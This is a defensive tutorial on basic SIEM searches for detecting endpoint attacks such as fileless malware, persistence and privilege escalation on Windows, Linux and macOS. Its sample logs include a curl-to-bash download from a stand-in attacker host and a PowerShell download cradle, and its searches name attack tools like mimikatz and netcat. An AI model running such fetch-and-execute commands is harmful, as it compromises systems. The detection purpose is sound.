# 🛡️💻 Endpoint Threat Detection  
Fundamental Searches for Endpoint-Based Attacks  
(Windows • Linux • macOS)

This file focuses on **detecting endpoint threats** across **workstations and laptops**, using **basic searches** suitable for the *Fundamental Searches* level.  
Endpoint threat detection is essential for identifying **malware, ransomware, living-off-the-land attacks, persistence techniques, and user-based abuse**.

---

## 🎯 Purpose
- Detect **malicious processes and binaries**
- Identify **script-based and fileless attacks**
- Monitor **persistence mechanisms**
- Track **credential abuse and privilege escalation**
- Support SOC investigations and endpoint incident response

---

## 🖥️ Platforms Covered

### 🪟 Windows
- Windows Event Logs (Security, System, Application)
- PowerShell & Script Block logs
- Defender / EDR alerts

### 🐧 Linux
- Syslog / journalctl
- Auditd logs
- Process execution logs

### 🍎 macOS
- Unified logs
- Endpoint Security framework logs
- Application execution events

---

## 📂 Common Log Sources
- Endpoint Detection & Response (EDR)
- OS security logs
- Script and command execution logs
- Antivirus and anti-malware alerts

---

## 🧾 Sample Logs

### 🪟 Windows – Suspicious PowerShell
```
2025-03-12 12:01:22 EventID=4104 ScriptBlock="Invoke-Expression (New-Object Net.WebClient)"
```

### 🐧 Linux – Suspicious Command Execution
```
Mar 12 12:03:10 host01 user=bob cmd="curl http://evil.site/payload.sh | bash"
```

### 🍎 macOS – Unknown Binary Executed
```
2025-03-12 12:05:33 process=unknown_binary user=alice action=execute
```

---

## 🔍 Fundamental Search Examples

### 🧨 Suspicious Script Execution
```spl
| search ScriptBlock="*Invoke-*" OR cmd="*curl*" OR cmd="*wget*"
```

### 🧠 Rare or New Processes
```spl
| stats count by process
| where count < 2
```

### 🔐 Privilege Escalation Attempts
```spl
| search cmd="*sudo*" OR user IN ("admin","root")
```

### 🧬 Known Malware Tools
```spl
| search process IN ("mimikatz","powershell.exe","nc","ncat")
```

---

## 🚨 Detection Scenarios

### 🧨 Fileless Malware
```spl
| search ScriptBlock="*DownloadString*" OR cmd="*base64*"
```

### 🕵️ Persistence Mechanisms
```spl
| search "RunKey" OR "cron" OR "launchctl"
```

### ⚠️ Endpoint Threats Outside Business Hours
```spl
| where date_hour < 8 OR date_hour > 18
```

---

## 🛡️ Mitigation & Response
- Isolate compromised endpoints
- Block malicious binaries and scripts
- Enforce endpoint hardening policies
- Review EDR alerts and telemetry
- Correlate endpoint activity with network and IAM logs

---

## 📌 Summary
This file provides **fundamental endpoint threat detection** across:
- 🪟 Windows
- 🐧 Linux
- 🍎 macOS

It helps detect **endpoint-based attacks, malware, and persistence techniques**.

